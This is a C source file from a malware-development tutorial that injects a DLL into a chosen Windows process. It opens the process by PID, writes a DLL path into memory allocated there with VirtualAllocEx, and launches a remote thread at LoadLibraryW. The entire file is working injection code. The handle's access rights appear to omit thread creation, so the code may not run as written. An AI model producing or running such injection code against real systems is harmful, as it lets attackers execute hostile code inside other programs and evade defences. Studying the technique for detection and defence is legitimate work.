/*
	@author     crow
	@brief      inject a DLL into a target process using win32 API
	@site       https://crows-nest.gitbook.io/crows-nest/malware-development/process-injection/dll-injection
	@credits    x0reaxeax, 5pider, bakki - for being my BFFs and constantly helping me improve
*/

#include <Windows.h>
#include <stdio.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)

int main(int argc, char* argv[]) {

	/*------[SETUP SOME VARIABLES]------*/
	DWORD       TID               = NULL;
	DWORD       PID               = NULL;
	LPVOID      rBuffer           = NULL;
	HANDLE      hProcess          = NULL;
	HANDLE      hThread           = NULL;
	HMODULE     hKernel32         = NULL;
	wchar_t     dllPath[MAX_PATH] = L"C:\\path\\to\\crow.dll";
	size_t      pathSize          = sizeof(dllPath);
	size_t      bytesWritten      = 0;

	/*------[GET HANDLE TO PROCESS]------*/
	if (argc < 2) {
		warn("usage: %s <PID>", argv[0]);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	info("trying to get a handle to the process (%ld)", PID);
	hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID);

	if (hProcess == NULL) {
		warn("unable to get a handle to the process (%ld), error: 0x%lx", PID, GetLastError());
		return EXIT_FAILURE;
	}

	okay("got a handle to the process!");
	info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);

	/*------[GET HANDLE TO KERNEL32]------*/
	info("getting handle to Kernel32.dll");
	hKernel32 = GetModuleHandleW(L"kernel32");

	if (hKernel32 == NULL) {
		warn("failed to get a handle to Kernel32.dll, error: 0x%lx", GetLastError());
		return EXIT_FAILURE;
	}

	okay("got a handle to Kernel32.dll");
	info("\\___[ hKernel32\n\t\\_0x%p]\n", hKernel32);

	/*------[GET ADDR OF LOADLIBRARY]------*/
	info("getting address of LoadLibraryW()");
	LPTHREAD_START_ROUTINE kawLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
	okay("got address of LoadLibraryW()");
	info("\\___[ LoadLibraryW\n\t\\_0x%p]\n", kawLoadLibrary);

	/*------[ALLOCATE A BUFFER]------*/
	info("allocating memory in target process");
	rBuffer = VirtualAllocEx(hProcess, NULL, pathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);

	if (rBuffer == NULL) {
		warn("couldn't allocate a buffer to the target process memory, error: 0x%lx", GetLastError());
		goto CLEANUP;
	}

	okay("allocated buffer in target process memory (PAGE_READWRITE)");

	/*------[WRITE TO MEMORY]------*/
	info("writing to allocated buffer");
	WriteProcessMemory(hProcess, rBuffer, dllPath, pathSize, &bytesWritten);
	okay("wrote %zu-bytes to the process memory", bytesWritten);

	/*------[CREATE A THREAD]------*/
	info("creating a thread");
	hThread = CreateRemoteThread(hProcess, NULL, 0, kawLoadLibrary, rBuffer, 0, &TID);

	if (hThread == NULL) {
		warn("unable to create thread, error: 0x%lx", GetLastError());
		goto CLEANUP;
	}

	okay("created a new thread in the target process! (%ld)", TID);
	info("\\___[ hThread\n\t\\_0x%p]\n", hThread);

	/*------[CLEANLY EXIT]------*/
	info("waiting for thread to finish");
	WaitForSingleObject(hThread, INFINITE);
	okay("thread finished execution");
	goto CLEANUP;

CLEANUP:

	if (hThread) {
		info("closing handle to thread");
		CloseHandle(hThread);
	}

	if (hProcess) {
		info("closing handle to process");
		CloseHandle(hProcess);
	}

	okay("finished with house keeping, see you next time!");
	return EXIT_SUCCESS;

}